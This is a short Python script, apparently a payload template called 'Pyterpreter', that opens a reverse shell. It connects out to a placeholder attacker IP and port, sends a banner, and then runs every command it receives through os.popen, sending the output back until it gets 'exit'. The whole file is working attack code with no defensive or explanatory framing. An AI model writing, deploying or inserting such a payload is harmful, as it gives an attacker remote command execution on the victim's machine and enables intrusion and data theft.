#!/usr/bin/python3
import os
import socket

attacker_ip = "$IP"
port = $PORT
buffersize = 10240

banner = "welcome To Pyterpreter"

s = socket.socket()
s.connect((attacker_ip, port))
s.send(banner.encode())
while True:
    command = s.recv(buffersize).decode()
    if command.lower() == 'exit':
        break
    elif command.split(' ')[0] == 'cd':
        current = os.getcwd()
        os.chdir("{}/{}".format(current, command.split(' ')[1]))
        pass
    output = os.popen(command).read()
    s.send(output.encode())
s.close()
